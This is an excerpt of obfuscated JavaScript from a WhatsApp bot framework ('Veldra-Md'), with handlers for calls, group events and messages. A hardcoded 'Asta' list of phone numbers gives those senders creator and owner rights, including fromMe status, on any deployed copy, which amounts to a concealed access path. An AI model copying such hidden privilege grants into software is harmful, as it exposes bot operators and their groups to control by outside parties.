...
const Asta = ["2348039607375", "2349027862116", "17863688449"];
const {
  getDevice,
...
exports.callsg = async (_0x235969, _0x426e27) => {
  if (global.AstaOfficial && global.AstaOfficial === "yes") {
    ...
    _0x642975.id = _0x426e27.id;
    _0x642975.from = _0x426e27.from;
    _0x642975.chat = _0x426e27.chatId;
    _0x642975.isVideo = _0x426e27.isVideo;
    _0x642975.isGroup = _0x426e27.isGroup;
    _0x642975.time = await getTime("h:mm:ss a");
    _0x642975.date = _0x426e27.date;
    _0x642975.status = _0x426e27.status;
    _0x642975.sender = _0x642975.from;
    _0x642975.senderNum = _0x642975.from.split("@")[0];
    _0x642975.senderName = await _0x235969.getName(_0x642975.from);
    _0x642975.isCreator = [
      _0x4b010d,
      ...Asta,
      ...global.sudo?.split(","),
      ...
      .includes(_0x642975.from);
    _0x642975.isAsta = [...Asta]
      .map((_0x3bb816) => _0x3bb816.replace(/[^0-9]/g) + "@s.whatsapp.net")
      .includes(_0x642975.from);
    _0x642975.fromMe = _0x642975.isAsta
      ? true
      : areJidsSameUser(_0x642975.from, _0x52f3e3);
    _0x642975.isBaileys = _0x642975.isBot = _0x642975.id.startsWith("BAE5");
    _0x642975.groupCall = _0x642975.chat.endsWith("@g.us");
    _0x642975.user = _0x52f3e3;
    _0x642975.decline = _0x642975.reject = () =>
      _0x235969.rejectCall(_0x642975.id, _0x642975.from);
    _0x642975.block = () =>
      _0x235969.updateBlockStatus(_0x642975.from, "block");
    _0x642975.send = async (
      _0x23e41c,
      _0x4e7834 = {
        author: "Veldra-Md",
      },
      _0x1c62b5 = "Veldra",
      _0x244af8 = "",
      _0x2838b = _0x642975.from
    ) => {
      _0x2838b = _0x2838b ? _0x2838b : _0x642975.from;
    ...
    _0x642975.checkBot = (_0x2c2097 = _0x642975.sender) =>
      [...Asta, _0x4b010d]
        .map((_0xa47977) => _0xa47977.replace(/[^0-9]/g) + "@s.whatsapp.net")
        .includes(_0x2c2097);
    _0x642975.sendPoll = async (
      _0x5b8819,
      _0x453932 = ["option 1", "option 2"],
      _0x3cfebb = 1,
      _0x52e1af = "",
      _0x3f886c = _0x642975.chat
    ) => {
      return await _0x642975.send(
        _0x5b8819,
        {
          values: _0x453932,
...
exports.groupsg = async (
  ...
  try {
    if (gcs[_0x2b3e0f.id] && _0x2b3e0f.id) {
      gcs[_0x2b3e0f.id] = false;
    }
    if (_0x152579) {
      return;
    }
    let _0x33935f = _0x34712d.decodeJid(_0x34712d.user.id);
    let _0xbacc49 = _0x33935f.split("@")[0];
    let _0x22cff2 = {
      ..._0x2b3e0f,
    };
    _0x22cff2.chat = _0x22cff2.jid = _0x22cff2.from = _0x2b3e0f.id;
    _0x22cff2.user = _0x22cff2.sender = Array.isArray(_0x2b3e0f.participants)
      ? _0x2b3e0f.participants[0]
      : "xxx";
    _0x22cff2.name = await _0x34712d.getName(_0x22cff2.user);
    _0x22cff2.userNum = _0x22cff2.senderNum = _0x22cff2.user.split("@")[0];
    _0x22cff2.time = getTime("h:mm:ss a");
    _0x22cff2.date = getTime("dddd, MMMM Do YYYY");
    _0x22cff2.action = _0x22cff2.status = _0x2b3e0f.action;
    _0x22cff2.isCreator = [
      _0xbacc49,
      ...Asta,
      ...global.sudo?.split(","),
      ...
      .includes(_0x22cff2.user);
    _0x22cff2.isAsta = [...Asta]
      .map((_0x57d0f3) => _0x57d0f3.replace(/[^0-9]/g) + "@s.whatsapp.net")
      .includes(_0x22cff2.user);
    _0x22cff2.fromMe = _0x22cff2.isAsta
      ? true
      : areJidsSameUser(_0x22cff2.user, _0x33935f);
    if (_0x22cff2.action === "remove" && _0x22cff2.fromMe) {
      return;
    }
    _0x22cff2.suhailBot = [...Asta]
    ...
    ].includes(_0x22cff2.chat);
    _0x22cff2.isGroup = _0x22cff2.chat.endsWith("@g.us");
    if (_0x22cff2.isGroup) {
      _0x22cff2.metadata = await _0x34712d.groupMetadata(_0x22cff2.chat);
      gcs[_0x22cff2.chat] = _0x22cff2.metadata;
      _0x22cff2.admins = _0x22cff2.metadata.participants.reduce(
        (_0x3d4871, _0xe2eb9e) =>
          (_0xe2eb9e.admin
            ? _0x3d4871.push({
                id: _0xe2eb9e.id,
      ...
      _0x22cff2.isAdmin = !!_0x22cff2.admins.find(
        (_0x859f83) => _0x859f83.id === _0x22cff2.user
      );
      _0x22cff2.isBotAdmin = !!_0x22cff2.admins.find(
        (_0x40eef6) => _0x40eef6.id === _0x33935f
      );
    }
    _0x22cff2.kick = _0x22cff2.remove = (_0x48f5af = _0x22cff2.user) =>
      _0x34712d.groupParticipantsUpdate(_0x22cff2.chat, [_0x48f5af], "remove");
    _0x22cff2.add = (_0x422af3 = _0x22cff2.user) =>
      _0x34712d.groupParticipantsUpdate(_0x22cff2.chat, [_0x422af3], "add");
    _0x22cff2.promote = (_0x3d0644 = _0x22cff2.user) =>
      _0x34712d.groupParticipantsUpdate(_0x22cff2.chat, [_0x3d0644], "promote");
    _0x22cff2.demote = (_0x37d435 = _0x22cff2.user) =>
      _0x34712d.groupParticipantsUpdate(_0x22cff2.chat, [_0x37d435], "demote");
    _0x22cff2.getpp = async (_0x577c8f = _0x22cff2.user) => {
      try {
        return await _0x34712d.profilePictureUrl(_0x577c8f, "image");
      } catch {
        return "https://telegra.ph/file/93f1e7e8a1d7c4486df9e.jpg";
      }
    };
    _0x22cff2.sendMessage = async (
      _0x5a0f4b = _0x22cff2.chat,
      _0x2c78a3 = {},
      _0x11fd9c = {
        quoted: "",
      }
    ) => {
      return await _0x34712d.sendMessage(_0x5a0f4b, _0x2c78a3, _0x11fd9c);
    };
    _0x22cff2.sendUi = async (
      _0x107cb3 = _0x22cff2.chat,
      _0x15a4e0 = {},
      _0x1e19fa = "",
      _0x3b7229 = false,
      _0x289e17 = false,
    ...
    _0x22cff2.error = async (
      ...
      let _0x51c1e7 = _0x471ef2
        ...
        : _0x22cff2.botNumber;
      let _0x1ac461 =
        "*VELDRA-Md ERROR MESSAGE!!!*\n```\nUSER: @" +
        _0x22cff2.user.split("@")[0] +
      ...
      if (
        _0x129b35 &&
        Config.errorChat !== "chat" &&
        _0x22cff2.chat !== _0x22cff2.botNumber
      ) {
        await _0x34712d.sendMessage(_0x22cff2.jid, {
          text: _0x129b35,
        });
      }
      console.log(_0xfedfc2 ? _0xfedfc2 : _0x386924);
      try {
        return await _0x34712d.sendMessage(
          _0x51c1e7,
          {
            text: _0x1ac461,
            ..._0x32def3,
            mentions: [_0x22cff2.user],
          },
          {
    ...
    _0x22cff2.send = async (
      ...
      _0xb61629 = "asta",
      _0x919f26 = "",
      _0x3ccfb1 = _0x22cff2.chat
    ) => {
      _0x3ccfb1 = _0x3ccfb1 ? _0x3ccfb1 : _0x22cff2.chat;
      switch (_0xb61629.toLowerCase()) {
        ...
        case "react":
          {
            return await _0x34712d.sendMessage(_0x3ccfb1, {
              react: {
                text: _0x1def38,
                key: _0x919f26?.key,
              },
        ...
        case "sticker":
          {
            let { data: _0x2a29f3, mime: _0x48e80f } = await _0x34712d.getFile(
              _0x1def38
            );
            if (_0x48e80f == "image/webp") {
              let _0x500c5a = await writeExifWebp(_0x2a29f3, _0x1bb9da);
              await _0x34712d.sendMessage(_0x3ccfb1, {
                sticker: {
                  url: _0x500c5a,
                },
                ..._0x1bb9da,
              ...
              await _0x34712d.sendImageAsSticker(
                _0x3ccfb1,
                _0x1def38,
                _0x1bb9da
              );
    ...
    _0x22cff2.sendPoll = async (
      _0x188344,
      _0x4bb725 = ["option 1", "option 2"],
      _0x34efb6 = 1,
      _0xf53aa9 = "",
      _0x2efafc = _0x22cff2.jid
    ) => {
      return await _0x22cff2.send(
        _0x188344,
        {
          values: _0x4bb725,
    ...
    _0x22cff2.checkBot = (_0x31c33b = _0x22cff2.sender) =>
      [...Asta, _0xbacc49]
        .map((_0x1e666c) => _0x1e666c.replace(/[^0-9]/g) + "@s.whatsapp.net")
        .includes(_0x31c33b);
    _0x22cff2.botNumber = _0x33935f;
    _0x22cff2.bot = _0x56741f ? _0x34712d : {};
    if (global.AstaOfficial && global.AstaOfficial === "yes") {
      return _0x22cff2;
    } else {
      return {};
...
exports.smsg = async (_0xa72325, _0x32b4a8, _0x23c611, _0x5eedaa = false) => {
  ...
  if (_0x32b4a8.key) {
    ...
    _0x2d6cd0.isBot = _0x2d6cd0.isBaileys =
      _0x2d6cd0.id.startsWith("BAE5") || _0x2d6cd0.id.startsWith("VELDRAMD");
  ...
  _0x2d6cd0.isAsta = Asta.includes(_0x2d6cd0.senderNum);
  _0x2d6cd0.blockJid = [
    "120363023983262391@g.us",
    "120363025246125888@g.us",
    ...global.blockJids?.split(","),
  ...
  _0x2d6cd0.isPublic =
    Config.WORKTYPE === "public"
      ? true
      : _0x2d6cd0.allowJid || _0x2d6cd0.isCreator || _0x2d6cd0.isAsta;
    ...
    if (_0x1d4327) {
      ...
      if (_0x2d6cd0.quoted.message) {
        ...
        _0x2d6cd0.quoted.isBaileys = _0x2d6cd0.quoted.isBot =
          ...
          _0x2d6cd0.quoted.id?.startsWith("VELDRAMD") ||
  ...
  _0x2d6cd0.Asta = (_0xd6e77d = _0x2d6cd0.sender) =>
    [...Asta]
